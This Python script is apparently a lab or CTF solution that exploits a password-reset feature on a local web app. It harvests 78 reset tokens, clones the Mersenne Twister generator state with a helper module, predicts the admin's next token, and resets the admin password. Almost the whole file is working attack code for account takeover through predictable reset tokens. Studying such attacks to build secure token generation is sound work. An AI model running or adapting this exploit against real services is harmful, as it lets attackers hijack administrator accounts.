import requests
import unmixer
import base64

def main():
    base_URL = "http://localhost:8080"
    reset_URL = base_URL + "/forgot"
    register_URL = base_URL + "/register"
    adv_parameters = {'user':'adv', 'password':'password_lmao'}
    new_password = "lmao"
    admin_parameters = {'user':'admin', 'password':new_password}
    adv = unmixer.unmixer()

    # First register adversary as a user
    req = requests.post(register_URL, adv_parameters)

    # Generate 78 tokens and add them to array for processing later
    for i in range(78):
        r = requests.post(reset_URL, adv_parameters)
        info = r.text
        token_start = info.find('token=') + 6
        token_end = info.find('<!--close_token-->')
        b64token = info[token_start:token_end]
        print("Processing token #{}: {}".format(i+1, b64token))
        adv.b64_tokens[i] = b64token
    
    # Once all tokens generated, recreate MT
    victim_arr = [0] * 78
    for i in range(78):
        victim_arr[i] = base64.b64decode(adv.b64_tokens[i]).decode('utf-8')
    tokens = adv.split_nums(victim_arr)
    adv.crack_it(tokens)
    for i in range(624):
        adv.mt.extract_number()
    adv_guess = str(adv.mt.extract_number())
    for j in range(7):
        adv_guess += ":" + str(adv.mt.extract_number())
    admin_url = base_URL + "/reset?token=" + base64.b64encode(adv_guess.encode('utf-8')).decode('utf-8')
    print("Admin's Password Reset URL: {}".format(admin_url))

    # Now generate token as admin so url can be used
    requests.post(reset_URL, admin_parameters)

    # Now reset password for admin
    requests.post(admin_url, admin_parameters)

    print("Admin's Password has succesfully been changed to: {}. Have fun!".format(new_password))



if __name__ == '__main__':
    main()